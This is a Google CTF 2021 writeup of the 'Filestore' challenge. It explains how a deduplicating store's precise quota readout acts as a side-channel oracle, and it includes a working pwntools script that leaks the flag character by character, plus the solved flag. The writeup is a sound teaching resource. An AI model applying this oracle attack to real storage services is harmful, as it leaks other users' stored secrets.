# Google CTF 2021 - Filestore writeup
Originally from my Google Gist Writeup submission here: https://gist.github.com/Diesel-Hadez/a10e67d04c88ca005890b6f85c992fb3

This challenge was under Misc. It looked simple enough, so I took a stab at it.
The challenge can be found [here](https://github.com/google/google-ctf/blob/master/2021/quals/misc-filestore/challenge/filestore.py)

## How it works
The program stores the flag inside it.
It also allows you to enter text inside it, at which point it would give you an ID.
Using that ID, you can retrieve back your text.
You have a limited capacity of text you can store in your program. You can see how much you have used
by using the "status" command.
    

## Analysis
Most importantly, Filestore has some logic in it to save some storage space (de-duplication). This will, instead of writing the input text to a new location,
checks if your input text already exists (technically 16-byte chunks of it), and use a pointer to that instead.
    
    while data:
            prefix = data[:MINIMUM_BLOCK]
            ind = -1
            bestlen, bestind = 0, -1
            while True:
                # see if the prefix data (up to MINIMUM_BLOCK) already exists)
                ind = blob.find(prefix, ind+1)
                if ind == -1: break
                # ...
            if bestind != -1:
                # Use it if you can
                part, data = data[:bestlen], data[bestlen:]
                part_list.append((bestind, bestlen))
            # ...

The ID that they give you is randomly generated and isn't important, but what _is_ important is that there is an additional function called
"status". 

It can't be a coincidence that under Quota (the amount you have used up so far), they give the format in the format of 0.00X kilobytes.
This means that every single _new_ byte you add (ignoring the de-duplicating logic), you can see it reflected, because 1 byte is 0.001 kilobytes. If it weren't
for the three decimal places, this wouldn't work!

We know from other Google CTF challenges that the flag likely starts with "CTF{". So let's try "store" that string into the program. Before that, 
run 'status' to see how much storage you have.
In my case, this was `Quota: 0.026kB/64.000kB`. I then ran `store` and entered `CTF{`, then 'status' again, and lo and behold,
it was _still_ `Quota: 0.026kB/64.000kB`. Just to make sure we understand the "Quota" correctly, let's run it with some other text we can be
reasonably certain isn't part of the flag. I put in `ZZZ`, ran 'status' again, and got `Quota: 0.029kB/64.000kB`, exactly _three_ bytes more! Which is the
_exact_ length of 'ZZZ'!

All that's left to do is to run it with different values until you get a Quota that remains unchanged, because an unchanged Quote means that is part of the real flag.
E.g:

    "CTF{" -> "Quota: 0.026kB/64.000kB"
    "CTF{A" -> "Quota: 0.031kB/64.000kB" (5 bytes extra from "CTF{A")
    "CTF{B" -> "Quota: 0.036kB/64.000kB" (5 bytes extra from "CTF{B")
    "CTF{C" -> "Quota: 0.036kB/64.000kB" (We got the first letter! Onto the second!)

You should see that the Quota remains unchanged for correct letters.
And so I tried it with all printable characters to see if I could get it this way. 

Eventually, I got these characters.
    
    CTF{CR1M3_0f_d3d
    
That looks promising. The [leetspeak](https://en.wikipedia.org/wiki/Leet) for the word CRIME is clearly visible. Because of bug in my program, I accidentally got it to say `CTF{CR1M3_0f_d3d00`, in which case
I thought it was going to be something like `CTF{CR1M3_0f_d3d00m}`, when that didn't pan out, I waited a little longer and got `CTF{CR1M3_0f_d3d00CT`,
in which case I thought `CTF{CR1M3_0f_d3d00CT10N}` in reference to the deduction of the characters. Eventually, I figured out there was a bug in my program and the only
correct part was `CTF{CR1M3_0f_d3d`, and the 00 was just a bug, and the `CT` possibly being a loop back too `CTF` as the result of my bug. However, even without the bug,
it refused to find anything.

The reason for this is simple, going back to the code excerpt earlier,

    while data:
            prefix = data[:MINIMUM_BLOCK]

Note how the prefix only searches for the first `MINIMUM_BLOCK` bytes. Further up the code, we see this is assigned the value of 16. The string `CTF{CR1M3_0f_d3d`
is 16 bytes long, hence why it stopped. To remedy this, instead of using `CTF{` as the initial prefix to search for, I instead used the last 4 bytes which I have found,
`f_d3d`. The principles work the exact same way as previously. Eventually, I got the following output.

    f_d3dup1ic4ti0n}
    
Now I just merge my two results together to get the final flag!

    CTF{CR1M3_0f_d3dup1ic4ti0n}


## Code
Note that the domain will likely no longer be valid by the time you are reading this, but you can run it locally by uncommenting `sh = process(['python', 'filestore.py'])` and commenting out the line immediately after that.
Additionally, I used the [pwntools](https://docs.pwntools.com/en/stable/) library for this.

    #!/usr/bin/env python
    from pwn import *
    import string
    import random

    # This was changed from the initial "CTF{"
    current_flag = "f_d3d"

    #sh = process(['python', 'filestore.py'])
    sh = remote('filestore.2021.ctfcompetition.com', 1337)
    print('Starting...')
    sh.recvuntil(b'exit')

    former_quota = ''


    while '}' not in current_flag:
        for idx, c in enumerate(string.printable):
            sh.sendline(b'status');
            sh.recvuntil(b'Quota:')
            quota = sh.recvline()
            breakme = False
            if quota == former_quota:
                current_flag += string.printable[idx-1]
                print(current_flag)
                former_quota = ''.join(random.choice(string.printable) for x in range(20))
                sh.recvuntil(b'exit')
                sh.recvline()
                breakme = True
            else:
                pass
    #           print(former_quota)
    #           print("<- VS ->")
    #           print(quota)
            if breakme:
                break
            former_quota = quota
            sh.recvuntil(b'exit')

            sh.sendline(b'store')
            sh.recvuntil(b'line of data')
            sh.sendline(bytes(current_flag + c, 'utf-8'))
        if current_flag == "CTF{":
                print("All is lost :(")
                

    print(current_flag)
    sh.close()

    
## Closing thoughts
This was very fun, but a bit simple. Perhaps I was just lucky to very quickly gain the insight of the "Quota oracle" being useful very fast. Just goes to show
to consider _every_ data you expose as a potential point of vulnerability, no matter how benign you may find it. Another way to look at it is to think of not hand-rolling out algorithms yourself (except, perhaps, for learning purposes, or if you _really_ know what you are doing), as there would likely be something you didn't think of. In this case for example, perhaps it would have been better to use a standard compression algorithm.
